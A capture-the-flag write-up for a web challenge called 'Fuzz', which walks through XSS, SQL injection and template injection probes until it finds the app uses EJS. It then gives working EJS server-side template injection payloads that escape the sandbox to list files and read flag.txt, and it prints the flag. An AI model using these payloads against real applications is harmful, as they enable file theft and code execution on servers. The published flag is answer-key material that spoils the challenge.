---
layout: page
title: "Sentinels CTF challenges"
---
## link
https://sentinelsofvigil.ctfd.io/team

## Fuzz (Web, 150)
https://sentinelsofvigil-fuzz.chals.io

web fuzzing is testing various inputs for a web app and hoping to induce unwanted behaviour.

in this website, we are provided a text input. upon submitting the input, the app reflects the input.

using the payload `javascript <script>alert(1337)</script>` suggests XSS but nothing much can be done with that

using the payload `sql ' OR 1=1;--` or similar simply reflects the input as is with no errors thrown, suggesting no sqli vulnerability

next i attempted ssti using the jinja2 payload `jinja2{{7*7}}` but the input was again, simply reflected

i then did some googling and found the payload `{{<%[%'"}}%\.` on https://www.imperva.com/learn/application-security/server-side-template-injection-ssti/, which managed to throw an error, 'Error: Could not find matching close tag for "<%".'

according to chatgpt this error comes from EJS (embedded javascript)

the payload `<%= require('fs').readdirSync('.') %>` yields an error, 'ReferenceError: ejs:1 >> 1| Fuzzed <%= require('fs').readdirSync('.') %> require is not defined'

this suggests that the local environment doesn't have require, this can be circumvented by a payload like `<%= global.process.mainModule.require('fs').readdirSync('.') %>`, which lists all the contents of the source directory: 'Fuzzed Dockerfile,app.js,flag.txt,node_modules,package-lock.json,package.json'

we want to read flag.txt, this can be done using the payload `<%= this.constructor.constructor("return process.mainModule.require('fs').readFileSync('flag.txt', 'utf8')")() %>`

with that, we obtain the flag, 'SENTI{n0t_s0_r4nd0m_1npu7}'